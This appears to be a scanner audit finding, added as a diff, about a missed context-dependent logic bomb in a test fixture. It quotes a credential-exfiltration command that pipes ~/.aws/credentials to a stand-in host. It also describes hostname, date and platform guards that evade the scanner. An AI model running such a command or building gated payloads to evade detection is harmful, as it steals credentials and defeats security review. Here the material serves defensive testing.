@@ -1,0 +1,14 @@
+The scanner returned a clean result on `fixtures/AST08/V2-context-dependent-malice`, but this is an **INCOMPLETE** scan due to a coverage gap in detecting *Context-Dependent Malice* (AST08-S04), one of the four scenarios covered by the AST08-Poor-Scanning skill. The scanner missed the presence of a logic bomb — a malicious payload gated behind environment-specific conditions — because it failed to recognize the combination of a hostname check (`socket.gethostname() == "prod-agent-01"`) and a future date check (`datetime.date.today() > datetime.date(2026, 9, 1)`) wrapping a dangerous subprocess call that exfiltrates AWS credentials.
+
+This constitutes an **AST08 finding** under **Decision Rule 2 (Context-Dependent Malice)**, which states that identity probes (hostname, username, date, file existence) used as guards over malicious behavior are blind spots if not explicitly detected. The scanner matched neither the literal command (`curl`) nor the conditional structure, and because it does not parse Python's execution flow contextually, it treated the conditional branch as benign telemetry collection.
+
+Crucially, **the underlying payload must also be classified under its own category**: the exfiltration attempt — `tar czf - ~/.aws/credentials | curl -s -T - https://collector.example/u` — is a subprocess call accessing sensitive credentials and making unauthorized network contact. That behavior is an **AST01 (Command Execution)** and **AST03 (Permission Escalation)** concern, respectively. Per *Distinguishing AST08 from its neighbors*, we file **two findings**:
+- One **AST08** finding for the *scanner’s failure to detect the context-dependent trigger*,
+- One **AST01/AST03** finding for the *malicious payload itself*, now that it has been revealed.
+
+The scanner also passed `fixtures/AST08/C6-context-dependent-malice`, which is correct: that fixture contains a conditional (`platform.system() == "Darwin"`) used for legitimate portability, not identity-based targeting. However, this highlights a **deliberate boundary** in the shipped check for Context-Dependent Malice: per *What the four shipped checks decide*, **platform checks are excluded from the guard class** to avoid over-flagging legitimate cross-platform code. Therefore, a logic bomb gated on `platform.system()` would also evade detection — a gap **by design**, and one that remains **uncovered even if we fix detection of hostname/date guards**.
+
+In summary:
+- The scanner missed a **contextual logic bomb** in V2 due to lack of flow-aware parsing — an **AST08-S04** miss.
+- The **payload itself** (credential exfiltration via subprocess + network egress) must be filed separately under **AST01 and AST03**.
+- Even after fixing the rule to catch hostname/date guards, **platform-based logic bombs will remain undetected** — a known blind spot documented in the skill's design trade-offs.
